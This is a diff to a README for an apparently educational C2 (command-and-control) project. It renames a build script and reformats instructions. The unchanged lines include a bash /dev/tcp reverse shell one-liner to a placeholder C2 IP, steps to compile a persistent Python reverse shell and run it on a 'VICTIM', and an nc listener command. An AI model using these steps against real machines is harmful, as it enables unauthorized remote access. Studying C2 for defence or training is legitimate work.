@@ -5,10 +5,10 @@ Build and understand C2 infrastructure.
 
 `stardestroyer.py` is the "preffered" option to connecting to the C2 server.
 
-`compiler.sh` will convert `stardestroyer.py` into an EXE.
+`converter.sh` will convert `stardestroyer.py` into an EXE.
 
 # Web based C2
-![image](https://github.com/user-attachments/assets/2276420d-6134-48a0-8e2e-5e6a0ddef95b)
+![image](https://github.com/user-attachments/assets/e01272a6-1e5a-416c-8b56-45460317a349)
 
 # CLI based C2
 ![image](https://github.com/user-attachments/assets/e574c863-f44f-47fb-ad8a-7c3148b247e2)
@@ -26,13 +26,13 @@ Build and understand C2 infrastructure.
     - Linux / MacOS
       - This will drop the moment the C2 server 'drops'
       - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
-    - Python reverse shell
-      - This will continue to connect to the C2 server even after it 'drops'
-      - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
-      - `bash compiler.sh stardestroyer.py`
-      - Copy `stardestoryer` to VICTIM
-      - `chmod +x stardestroyer`
-      - `./stardestroyer`
+        - Python reverse shell
+          - This will continue to connect to the C2 server even after it 'drops'
+          - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
+          - `bash converter.sh stardestroyer.py`
+          - Copy `stardestoryer` to VICTIM
+          - `chmod +x stardestroyer`
+          - `./stardestroyer`
 4. Start your listener 
     - `nc -nvlp 4444`
 5. Forward the connection to your listener
@@ -51,7 +51,7 @@ Build and understand C2 infrastructure.
     - Python reverse shell
       - This will continue to connect to the C2 server even after it 'drops'
       - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
-      - `bash compiler.sh stardestroyer.py`
+      - `bash converter.sh stardestroyer.py`
       - Copy `stardestoryer` to VICTIM
       - `chmod +x stardestroyer`
       - `./stardestroyer`
